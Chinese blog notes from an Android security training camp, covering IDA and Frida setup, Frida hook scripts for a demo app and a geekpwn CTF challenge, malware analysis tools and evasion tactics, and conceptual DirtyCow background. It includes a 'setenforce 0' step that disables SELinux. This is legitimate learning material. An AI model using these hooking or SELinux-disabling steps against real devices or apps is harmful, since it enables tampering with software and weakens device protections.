+<h4 id="IDA-pro调试-so库"><a href="#IDA-pro调试-so库" class="headerlink" title="IDA pro调试.so库"></a>IDA pro调试.so库</h4><p>1、将<code>IDA</code>安装目录下的<code>dbgsrv</code>复制到<code>AVD</code>中，<code>adb shell</code>启动运行。</p>
+<p>2、<code>adb forward tcp:23946 tcp:23946</code>，进行端口转发，<code>IDA</code>随后<code>remote attach</code>进程，<code>ip</code>为<code>localhost</code>，端口<code>23946</code>。</p>
+<h3 id="移动应用渗透测试框架使用"><a href="#移动应用渗透测试框架使用" class="headerlink" title="移动应用渗透测试框架使用"></a>移动应用渗透测试框架使用</h3><h3 id="Xposed框架"><a href="#Xposed框架" class="headerlink" title="Xposed框架"></a>Xposed框架</h3><h3 id="frida-框架"><a href="#frida-框架" class="headerlink" title="frida 框架"></a>frida 框架</h3><p><strong>Frida</strong>是一款基于<code>python + javascript</code> 的<code>hook</code>框架，适用于<code>android/ios/linux/win/osx</code>等平台。</p>
+<p>安装：</p>
+<p>电脑端：<code>pip install frida-tools</code>。</p>
+<p>Android端：从<code>github release</code>页面下载<code>frida-server</code>。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> adb root <span class="hljs-comment"># might be required</span><br><span class="hljs-variable">$</span> adb push frida<span class="hljs-literal">-server</span> /<span class="hljs-keyword">data</span>/local/tmp/ <br><span class="hljs-variable">$</span> adb shell <span class="hljs-string">&quot;chmod 755 /data/local/tmp/frida-server&quot;</span><br><span class="hljs-variable">$</span> adb shell <span class="hljs-string">&quot;/data/local/tmp/frida-server &amp;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>特别的，如果华为手机出现：</p>
+<p>selinux报错</p>
+<p>需要：<code>setenforce 0</code>。</p>
+<p>至此安装完毕，这里练习一个<code>Demo</code>。以下是<code>apk</code>的源码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> Button mBtnInvokeFunc;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        mBtnInvokeFunc = findViewById(R.id.btn_invoke_func);<br>        setOnClickListener();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOnClickListener</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">OnClick</span> <span class="hljs-variable">onClick</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OnClick</span>();<br>        mBtnInvokeFunc.setOnClickListener(onClick);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hookFunction</span><span class="hljs-params">()</span>&#123;<br>        Log.d(<span class="hljs-string">&quot;hookFunction&quot;</span>, <span class="hljs-string">&quot;UnHooked.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OnClick</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>            Intent intent;<br>            <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>                <span class="hljs-keyword">case</span> R.id.btn_invoke_func:<br>                    hookFunction();<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里需要<code>hook</code>的是<code>MainActivity</code>中的<code>hookfunction</code>。<code>python hook</code>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><br>device = frida.get_device(<span class="hljs-string">&quot;emulator-5554&quot;</span>, timeout=<span class="hljs-number">5</span>)<br>process = device.attach(<span class="hljs-string">&quot;top.handsome.toturial&quot;</span>)<br>script = process.create_script(<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Java.perform(function () &#123;</span><br><span class="hljs-string">    var MainActivity = Java.use(&#x27;top.handsome.toturial.MainActivity&#x27;);</span><br><span class="hljs-string">    var hookFunction = MainActivity.hookFunction;</span><br><span class="hljs-string">    hookFunction.implementation = function () &#123;</span><br><span class="hljs-string">        console.log(&#x27;Done: isHooked.&#x27;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>)<br><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br>script.load()<br>sys.stdin.read()<br></code></pre></td></tr></table></figure>
+
+<h2 id="第二天-01月14日"><a href="#第二天-01月14日" class="headerlink" title="第二天 01月14日"></a>第二天 01月14日</h2><p>Why Android：<code>APP</code>-移动互联网的入口、安全研究的“交集”，<code>Android</code>的市场份额很大。</p>
+<h3 id="Android应用程序"><a href="#Android应用程序" class="headerlink" title="Android应用程序"></a>Android应用程序</h3><h4 id="APK文件格式"><a href="#APK文件格式" class="headerlink" title="APK文件格式"></a>APK文件格式</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/apk_structure.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="activity生命周期"><a href="#activity生命周期" class="headerlink" title="activity生命周期"></a>activity生命周期</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/activity_lifecycle.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="逆向技术和方法"><a href="#逆向技术和方法" class="headerlink" title="逆向技术和方法"></a>逆向技术和方法</h3><h4 id="逆向流程"><a href="#逆向流程" class="headerlink" title="逆向流程"></a>逆向流程</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/liucheng.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>反编译阶段：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/apk_decom.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>目标定位：</p>
+<ul>
+<li>关键字定位：常规的搜索、<code>grep</code>反编译后的静态代码、动态加载的代码、监控文件变化。</li>
+<li>资源定位：定位<code>UI</code>中的资源变量名，如按钮。<code>res</code>目录中寻找变量对应的索引值。在<code>smali</code>代码中<code>grep</code>所有对该索引的引用。</li>
+<li>日志定位：<code>adb logcat | grep</code>，<code>APP</code>目录下的日志文件、<code>sdcard</code>下的日志文件。打开<code>APP</code>内置的日志开关：重打包，<code>hook</code>，<code>smali</code>注入。</li>
+<li>调用栈跟踪：去<code>hook</code>系统函数打印<code>callback</code>。</li>
+</ul>
+<p>核心目标逆向：</p>
+<ul>
+<li><p>静态分析</p>
+<ul>
+<li>直接分析smali代码</li>
+<li>分析伪java代码</li>
+<li>直接分析arm指令</li>
+<li>分析伪c++代码</li>
+</ul>
+</li>
+<li><p>动态调试</p>
+<ul>
+<li>Android Studio无源码调试</li>
+<li>IDA调试so</li>
+<li>Hook技术</li>
+<li>注入到目标代码，改变执行结果。</li>
+<li>获取某一状态下的变量值。</li>
+<li>hook的本质是代码注入</li>
+<li>Xposed、Frida。</li>
+</ul>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/frida_xposed.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/frida_hook.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>使用Frida hook app：</p>
+<ul>
+<li>使用场景：root设备直接运行frida-server、非root设备重打包Frida-garget.so。</li>
+<li>两种模式：Attach已有进程上附加、Spawn新起一个进程。</li>
+</ul>
+</li>
+<li><p>动静结合</p>
+</li>
+<li><p>打造自己的逆向工具链</p>
+</li>
+</ul>
+<h3 id="应用安全防护与对抗"><a href="#应用安全防护与对抗" class="headerlink" title="应用安全防护与对抗"></a>应用安全防护与对抗</h3><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/apk_protect.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="代码混淆及对抗"><a href="#代码混淆及对抗" class="headerlink" title="代码混淆及对抗"></a>代码混淆及对抗</h4><p>利用反编译工具的bug或漏洞，AndroidManifest.xml，dex，so。转换成伪代码时的bug，Smali -&gt; java，Arm指令 -&gt; C++。链接资源文件时的bug，如特殊的资源文件，超长的资源id。</p>
+<p>将代码变得难以阅读：1、变量名、类名、方法名混淆。2、字符串加密。3、控制流混淆，</p>
+<p>代码混淆工具：Java代码：ProGuard、DexGuard。C++代码：OLLVM。</p>
+<h4 id="反调试技术及对抗"><a href="#反调试技术及对抗" class="headerlink" title="反调试技术及对抗"></a>反调试技术及对抗</h4><p>对抗代码混淆</p>
+<ul>
+<li>变量名、类名、方法名混淆<ul>
+<li>变量重命名、jeb、重打包</li>
+<li>寻找老版本app</li>
+<li>根据开源代码映射</li>
+<li>自动化、自动化相似代码检测</li>
+</ul>
+</li>
+<li>字符串加密<ul>
+<li>静态分析替换</li>
+<li>动态hook</li>
+</ul>
+</li>
+<li>控制流混淆<ul>
+<li>优化反编译工具</li>
+<li>符号执行</li>
+</ul>
+</li>
+</ul>
+<h4 id="加壳和脱壳"><a href="#加壳和脱壳" class="headerlink" title="加壳和脱壳"></a>加壳和脱壳</h4><p>dex加固的流程：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dex_protect.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="题目-amp-经验分享"><a href="#题目-amp-经验分享" class="headerlink" title="题目&amp;经验分享"></a>题目&amp;经验分享</h3><h3 id="geekpwn-matryoshka"><a href="#geekpwn-matryoshka" class="headerlink" title="geekpwn matryoshka"></a>geekpwn matryoshka</h3><p>这个我在安卓模拟器中安装，<code>apk install</code>即可。随后逆向逻辑，看到只有MainAcitvity.getResult()返回“167042853”才可以，这里我直接使用<code>frida hook</code> <code>getResult</code>函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><br>device = frida.get_device(<span class="hljs-string">&quot;emulator-5554&quot;</span>, timeout=<span class="hljs-number">5</span>)<br>process = device.attach(<span class="hljs-string">&quot;com.geekpwn_ctf&quot;</span>)<br>script = process.create_script(<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Java.perform(function () &#123;</span><br><span class="hljs-string">    var String = Java.use(&quot;java.lang.String&quot;);</span><br><span class="hljs-string">    var MainActivity = Java.use(&#x27;com.geekpwn_ctf.MainActivity&#x27;);</span><br><span class="hljs-string">    var getResult = MainActivity.getResult;</span><br><span class="hljs-string">    getResult.implementation = function () &#123;</span><br><span class="hljs-string">        var ss = &quot;167042853&quot;;</span><br><span class="hljs-string">        console.log(&#x27;Done: isHooked.&#x27;);</span><br><span class="hljs-string">        return String.$new(ss);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>)<br><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br>script.load()<br>sys.stdin.read()<br></code></pre></td></tr></table></figure>
+
+<p>在<code>hook</code>状态下点击<code>pwn</code>按钮获得：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/geekpwn_1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>但是这道题目答案在<code>META-INF</code>文件夹下，其下多一个<code>CERT .SF</code>文件，使用<code>file</code>判断它是一个<code>zip</code>文件，然后用<code>m$W2h</code>作为密码循环解压获得一张二维码，扫码，得到<code>MD5</code>串，查询得到答案。</p>
+<h2 id="第三天-01月15日"><a href="#第三天-01月15日" class="headerlink" title="第三天 01月15日"></a>第三天 01月15日</h2><p>移动恶意代码分析</p>
+<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>各种数据展现了今天安卓平台上的安全威胁愈来愈多。</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>攻击手段的多样化，以及安卓端勒索病毒，恶意色情软件数量持续增长。</p>
+<p>以及目前在资产方面的威胁，攻击方式多如下图所示：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以及短信方面的社会工程：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以及持续扩大的威胁攻击面，表现为地下社会工程数据库，原始的数据积累、完善的黑产分工协作体系。</p>
+<p>病毒的命名体系：一般格式为、&lt;病毒前缀&gt;.&lt;病毒名&gt;.&lt;病毒后缀&gt;，如Worm.Sasser.b。</p>
+<p>趋势：恶意代码规模持续稳定增长、恶意代码高度产业化、移动端成为APT新战场。</p>
+<h3 id="恶意代码分析"><a href="#恶意代码分析" class="headerlink" title="恶意代码分析"></a>恶意代码分析</h3><h4 id="APK格式"><a href="#APK格式" class="headerlink" title="APK格式"></a>APK格式</h4><p>又是老生常谈的apk文件格式，它是zip格式，编码为ULEB128。</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>常用工具：Smaliviewer、APKTOOL&#x2F;baksamli、Dex2jar&#x2F;jd-gui、JEB、IDA、AndroidKiller、AndroidGuard、Virustotal。</p>
+<p>反混淆：<a target="_blank" rel="noopener" href="http://apk-deguard.com/">http://apk-deguard.com/</a></p>
+<ul>
+<li>快读定位法，敏感API查找。</li>
+</ul>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>对比法，白应用比较。</li>
+</ul>
+<p><img src="http://handsomedog.top/wp-content/uploads/2020/01/antian_6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>代码流程法、AndroidManifest.xml入手</li>
+</ul>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>一个个类看</li>
+</ul>
+<h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>工具：Andebug、IDA、smali hook、xposed&#x2F;substrate&#x2F;frida、wireshark&#x2F;tcpdump&#x2F;burpsuite&#x2F;findler2。</p>
+<p>感觉这多用的还是Hook技术。</p>
+<h4 id="分析系统"><a href="#分析系统" class="headerlink" title="分析系统"></a>分析系统</h4><p>相关工具：DroidBox、AndroGuard、Inpseckage基于xposed、RMS（antiy）、cuckoo（<a target="_blank" rel="noopener" href="https://cuckoosandbox.org)/">https://cuckoosandbox.org）</a></p>
+<p>方法一：模拟器</p>
+<p>emulator -tcpdump x.pcap</p>
+<p>方法二：tcpdump for ARM</p>
+<p><a target="_blank" rel="noopener" href="http://www.strazzere.com/android/tcpdump%E3%80%81%E9%9C%80%E8%A6%81root%E6%9D%83%E9%99%90%E3%80%82">http://www.strazzere.com/android/tcpdump、需要root权限。</a></p>
+<p>方法三：</p>
+<p>wifi + wireshark</p>
+<h4 id="恶意代码-在线系统"><a href="#恶意代码-在线系统" class="headerlink" title="恶意代码-在线系统"></a>恶意代码-在线系统</h4><ul>
+<li>Vitrustotal <a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com/</a></li>
+<li>Sandroid <a target="_blank" rel="noopener" href="http://sanddroid.xjtu.edu.cn/">http://sanddroid.xjtu.edu.cn</a></li>
+<li>Koodous <a target="_blank" rel="noopener" href="https://koodous.com/">https://koodous.com/</a></li>
+<li>Janus <a target="_blank" rel="noopener" href="https://www.appscan.io/">https://www.appscan.io</a></li>
+</ul>
+<p>更加注重分析工具、方法、手段等。以及工程化对抗，以及生态合作空间，和厂商对于反病毒的态度。</p>
+<h3 id="移动威胁情报"><a href="#移动威胁情报" class="headerlink" title="移动威胁情报"></a>移动威胁情报</h3><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="移动威胁对抗"><a href="#移动威胁对抗" class="headerlink" title="移动威胁对抗"></a>移动威胁对抗</h3><h4 id="对抗分析工具"><a href="#对抗分析工具" class="headerlink" title="对抗分析工具"></a>对抗分析工具</h4><p>Ptrace自身、https校验、检测父进程、伪&#x2F;加密、Axml &#x2F;资源文件对抗、自校验、畸形包、代码隐藏、加壳、混淆、加密、反射调用。</p>
+<h4 id="对抗用户感知"><a href="#对抗用户感知" class="headerlink" title="对抗用户感知"></a>对抗用户感知</h4><p>隐藏图标、透明图标、静默下载&#x2F;安装、预装、植入知名应用、伪装系统应用、ISP劫持、邮件、社工。</p>
+<h4 id="反跟踪"><a href="#反跟踪" class="headerlink" title="反跟踪"></a>反跟踪</h4><p>利用短链接、域名隐私保护、伪基站、动态DNS、盗用他人信息、使用云服务<br>、入侵无关站点。</p>
+<h3 id="恶意代码层次利用"><a href="#恶意代码层次利用" class="headerlink" title="恶意代码层次利用"></a>恶意代码层次利用</h3><h4 id="Application层"><a href="#Application层" class="headerlink" title="Application层"></a>Application层</h4><p>主要威胁：流氓推广，恶意预装、流氓广告、钓鱼应用、欺诈。</p>
+<h4 id="FrameWork层"><a href="#FrameWork层" class="headerlink" title="FrameWork层"></a>FrameWork层</h4><p>主要威胁：隐私窃取、拦截广播、勒索、远控、漏洞利用。尤其是在Native层，对抗分析、隐藏自身。</p>
+<h4 id="Kernel层"><a href="#Kernel层" class="headerlink" title="Kernel层"></a>Kernel层</h4><p>主要威胁：系统破坏、提权</p>
+<h4 id="RottenSys"><a href="#RottenSys" class="headerlink" title="RottenSys"></a>RottenSys</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="机器学习应用"><a href="#机器学习应用" class="headerlink" title="机器学习应用"></a>机器学习应用</h3><ul>
+<li>文件相似性检验</li>
+<li>聚类分析</li>
+<li>随机性识别</li>
+<li>色情应用识别</li>
+</ul>
+<h3 id="基于样本运营的互联网风控"><a href="#基于样本运营的互联网风控" class="headerlink" title="基于样本运营的互联网风控"></a>基于样本运营的互联网风控</h3><p>不听老师说，真不知道互联网黑灰产市场规模这么大。</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_10.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_11.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="第四天-01月16日"><a href="#第四天-01月16日" class="headerlink" title="第四天 01月16日"></a>第四天 01月16日</h2><p>CTF中的移动安全出题总体以安卓APP逆向居多，考察点多为逆向基本功。Pwn方向多为组件漏洞、WebView漏洞，Native漏洞利用。</p>
+<h3 id="主要是摸鱼"><a href="#主要是摸鱼" class="headerlink" title="主要是摸鱼"></a>主要是摸鱼</h3><h2 id="第五天-01月17日"><a href="#第五天-01月17日" class="headerlink" title="第五天 01月17日"></a>第五天 01月17日</h2><p>分布式网络&amp;分布式协同</p>
+<h3 id="分布式网络概述"><a href="#分布式网络概述" class="headerlink" title="分布式网络概述"></a>分布式网络概述</h3><p><strong>分布式网络</strong>是由不同地点的计算机系统连成的网络结构。</p>
+<p><strong>分布式系统</strong>是一个硬件或软件组件分布在不同的网络计算机上，彼此之间仅仅通过消息传递进行通信和协调的系统。</p>
+<h3 id="基于WIFI-Direct的漏洞挖掘"><a href="#基于WIFI-Direct的漏洞挖掘" class="headerlink" title="基于WIFI-Direct的漏洞挖掘"></a>基于WIFI-Direct的漏洞挖掘</h3><h3 id="蓝牙漏洞学习"><a href="#蓝牙漏洞学习" class="headerlink" title="蓝牙漏洞学习"></a>蓝牙漏洞学习</h3><h2 id="第六天-01月18日"><a href="#第六天-01月18日" class="headerlink" title="第六天 01月18日"></a>第六天 01月18日</h2><p>安卓提权漏洞基础、原理、利用和发现方法简介。</p>
+<p>动手：内核代码熟悉、编译。</p>
+<h3 id="安卓提权漏洞基础"><a href="#安卓提权漏洞基础" class="headerlink" title="安卓提权漏洞基础"></a>安卓提权漏洞基础</h3><p>Android NativeLib和Kernel简介和攻击面。Android完整系统源码c&#x2F;c++相比java更多。</p>
+<p>APP漏洞 vs 系统漏洞：影响设备、影响用户、查找难度、修补难度。</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E6%94%BB%E5%87%BB%E9%9D%A2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="安卓底层安全架构简介"><a href="#安卓底层安全架构简介" class="headerlink" title="安卓底层安全架构简介"></a>安卓底层安全架构简介</h4><p>这里在第一天讲过，不在赘述。再补充一下开源代码所遵循的协议：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%BC%80%E6%BA%90.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对于安卓开源问题，<code>linux kernel</code>使用<code>GPL</code>许可证。</p>
+<p>硬件开发商不愿意将自己的代码公开，所以谷歌用了：HAL层。</p>
+<ul>
+<li>修改内核，增加一些HAL的接口，这些代码使用GPL协议，完全公开。</li>
+<li>增加HAL层，调用上一步定义好的内核接口。</li>
+<li>在HAL层中定义好上层调用所需的统一API。</li>
+</ul>
+<p>Android底层安全框架及攻击缓释技术：</p>
+<p>1、自主访问控制</p>
+<ul>
+<li>基于uid、gid。容易被突破，但总比没有强。</li>
+</ul>
+<p>2、强制访问控制</p>
+<ul>
+<li>SELinux，完善之后攻破非常困难，极大降低攻击后的危害。</li>
+</ul>
+<p>3、验证启动模式（Verified Boot）</p>
+<ul>
+<li>通过硬件密钥，逐步验证整个系统。一旦出厂之后，不可修改。修改之后系统无法启动。（测试、解锁BootLoader后可以启动）。</li>
+</ul>
+<p>4、代码签名和平台密钥</p>
+<ul>
+<li>无法刷入任何非签名镜像。System级别的签名验证。</li>
+</ul>
+<p>Root相关基础知识：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/root%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="原生代码库及其攻击面"><a href="#原生代码库及其攻击面" class="headerlink" title="原生代码库及其攻击面"></a>原生代码库及其攻击面</h4><h4 id="内核攻击面"><a href="#内核攻击面" class="headerlink" title="内核攻击面"></a>内核攻击面</h4><h3 id="Android框架提权漏洞"><a href="#Android框架提权漏洞" class="headerlink" title="Android框架提权漏洞"></a>Android框架提权漏洞</h3><ul>
+<li>反序列化漏洞：7911</li>
+</ul>
+<h3 id="动手：内核代码熟悉、下载、和编译"><a href="#动手：内核代码熟悉、下载、和编译" class="headerlink" title="动手：内核代码熟悉、下载、和编译"></a>动手：内核代码熟悉、下载、和编译</h3><h4 id="竞争条件漏洞：脏牛（DirtyCow）"><a href="#竞争条件漏洞：脏牛（DirtyCow）" class="headerlink" title="竞争条件漏洞：脏牛（DirtyCow）"></a>竞争条件漏洞：脏牛（DirtyCow）</h4><p>基础知识梳理：</p>
+<ul>
+<li>虚拟内存管理和写时复制（<code>copy on write</code>）、页式内存管理和缺页中断、<code>linux</code>内存虚拟文件系统（<code>Proc</code>）、竞争条件（<code>Race condition</code>）、相关函数。</li>
+</ul>
+<p>漏洞分析：</p>
+<ul>
+<li>写时复制（<code>copy on write</code>）、竞争条件（<code>Race condition</code>）。</li>
+</ul>
+<p>利用方式：</p>
+<ul>
+<li><code>set-uid</code>位、<code>vdso</code>绕过<code>selinux</code>。</li>
+</ul>
+<h5 id="写时复制"><a href="#写时复制" class="headerlink" title="写时复制"></a>写时复制</h5><p>写入时复制是一种计算机程序设计领域的优化策略。其核心思想是，如果有多个调用者同时请求相同资源，他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（<code>private copy</code>）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。这个过程对其他的调用者是透明的（<code>transparently</code>）。此作法的主要优点是如果调用者没有修改该资源，就不会有副本（<code>private copy</code>）被建立，因此多个调用者只是读取操作是可以共享同一份资源。提高物理内存利用率：虚拟内存，物理内存，共享只读存储。提高fork等执行速度。</p>
+<p>Pagecache：Mmap之后不去读写，不载入内存，如果读写，载入内存。</p>
+<h5 id="页式内存管理和缺页中断"><a href="#页式内存管理和缺页中断" class="headerlink" title="页式内存管理和缺页中断"></a>页式内存管理和缺页中断</h5><p>Linux内存管理：换出暂时不用的内存到外存，用的时候再换回来。分页（4kb）管理。如果访问发现要用的不在内存中，进程访问出现缺页中断，之后内核负责将要用的页重新装入内存，如果内存已满，将暂时不用的其他页换出外存。这个过程由内核负责处理，用户进程无感知。</p>
+<h5 id="缺页中断"><a href="#缺页中断" class="headerlink" title="缺页中断"></a>缺页中断</h5><ul>
+<li>硬件陷入内核，在堆栈中保存程序计数器。大多数机器将当前指令的各种状态信息保<br>存在特殊的CPU寄存器中。</li>
+<li>启动一个汇编代码例程保存通用寄存器和其他易失的信息，以免被操作系统破坏。这<br>个例程将操作系统作为一个函数来调用。</li>
+<li>当操作系统发现一个缺页中断时，尝试发现需要哪个虚拟页面。通常一个硬件寄存器<br>包含了这一信息，如果没有的话，操作系统必须检索程序计数器，取出这条指令，用<br>软件分析这条指令，看看它在缺页中断时正在做什么。</li>
+<li>一旦知道了发生缺页中断的虚拟地址，操作系统检查这个地址是否有效，并检查存取<br>与保护是否一致。如果不一致，向进程发出一个信号或杀掉该进程。如果地址有效且<br>没有保护错误发生，系统则检查是否有空闲页框。如果没有空闲页框，执行页面置换<br>算法寻找一个页面来淘汰。</li>
